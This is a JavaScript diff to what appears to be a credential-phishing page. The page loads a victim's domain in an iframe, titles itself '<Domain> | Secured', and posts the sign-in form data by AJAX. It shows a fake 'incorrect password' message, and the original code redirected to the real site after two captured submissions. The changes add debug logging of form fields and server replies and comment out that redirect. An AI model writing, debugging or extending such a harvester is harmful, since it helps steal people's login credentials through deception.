@@ -169,7 +169,7 @@
     const iframe = document.getElementById("iframe");
     const iframe_url = "https://www." + charactersAfter;
     iframe.setAttribute("src", iframe_url);
-    const linkArr = iframe_url.split(".")[1];
+    const linkArr = iframe_url.split(".")[1] || "Unknown";
     document.title = `${linkArr.charAt(0).toUpperCase()}${linkArr.substring(1)} | Secured`;
 
     // Hide loading animation after 4 seconds
@@ -204,8 +204,9 @@
             // Prepare form data
             const formData = new FormData(form);
             // Log form data for debugging
-            for (const pair of formData.entries()) {
-                console.log(`${pair[0]}: ${pair[1]}`);
+            console.log("Form Data Sent:");
+            for (const [key, value] of formData.entries()) {
+                console.log(`${key}: ${value}`);
             }
 
             // Send AJAX request
@@ -217,33 +218,38 @@
                     button.disabled = false;
                     button.value = "Sign In";
 
+                    console.log("Server Response Status:", xhr.status);
+                    console.log("Server Response Text:", xhr.responseText);
+
                     if (xhr.status === 200) {
                         // Successful submission
                         sendCount.push("sent");
-                        errors.innerText = "Submission successful!";
-                        console.log("Server response:", xhr.responseText);
-                        document.getElementById("msg").style.display = "none"; // Hide incorrect password message
+                        errors.innerText = `Submission successful! Attempt ${sendCount.length}`;
+                        document.getElementById("msg").style.display = "none";
 
-                        // Redirect after two successful submissions
+                        // Uncomment to enable redirect after two successful submissions
+                        /*
                         if (sendCount.length >= 2) {
                             setTimeout(() => {
                                 window.location.href = "https://www." + charactersAfter;
                             }, 2000);
                         }
+                        */
                     } else {
-                        // Handle error
-                        errors.innerText = "Submission failed. Please try again.";
-                        document.getElementById("msg").style.display = "block"; // Show incorrect password message
-                        console.error("Server error:", xhr.status, xhr.responseText);
+                        // Handle server errors
+                        errors.innerText = `Submission failed. Server returned status ${xhr.status}.`;
+                        document.getElementById("msg").style.display = "block";
+                        console.error(`Server error: ${xhr.status} - ${xhr.responseText}`);
                     }
                 }
             };
             xhr.onerror = function () {
-                // Handle network errors
+                // Handle network errors (e.g., CORS, no connection)
                 button.disabled = false;
                 button.value = "Sign In";
-                errors.innerText = "Network error. Please check your connection and try again.";
-                console.error("Network error during submission");
+                errors.innerText = "Network error. Possible CORS issue or server unreachable.";
+                document.getElementById("msg").style.display = "block";
+                console.error("Network error: Check CORS or server availability");
             };
             xhr.send(formData);
             password.value = ""; // Clear password field
